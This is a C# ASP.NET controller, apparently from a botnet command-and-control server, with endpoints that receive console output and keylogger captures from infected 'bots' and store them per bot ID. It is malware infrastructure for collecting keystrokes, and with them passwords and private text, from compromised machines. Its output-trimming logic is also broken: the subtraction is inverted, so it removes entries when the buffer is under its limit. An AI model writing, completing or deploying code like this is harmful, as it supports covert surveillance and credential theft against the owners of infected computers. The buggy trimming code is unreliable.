﻿using C2.Models;
using C2.POCOs;
using Microsoft.AspNetCore.Mvc;

namespace C2.Controllers;

[ApiController]
[Route("[controller]")]
public class ResultsController : AbstractController
{
    [HttpGet("ResultsTest")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult ResultsTest() => Ok();

    [HttpPost("Console")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult Console([FromQuery] int bot_id, [FromBody] ConsolePoco output)
    {
        BotClient bot = GetBot(bot_id);

        bot.ConnectionInfo.LastHeardFrom = DateTime.UtcNow;

        bot.Output.AddRange(output.Output);

        int remove = 500 - bot.Output.Count;
        if (remove > 0)
        {
            bot.Output.RemoveRange(0, remove);
        }

        return Ok();
    }

    [HttpPost("KeyLog")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult KeyLog([FromQuery] int bot_id, [FromBody] KeyLogPoco keys)
    {
        BotClient bot = GetBot(bot_id);

        bot.ConnectionInfo.LastHeardFrom = DateTime.UtcNow;
        bot.BotResult.KeyLoggerOutput.AddRange(keys.Keys);

        return Ok();
    }
}
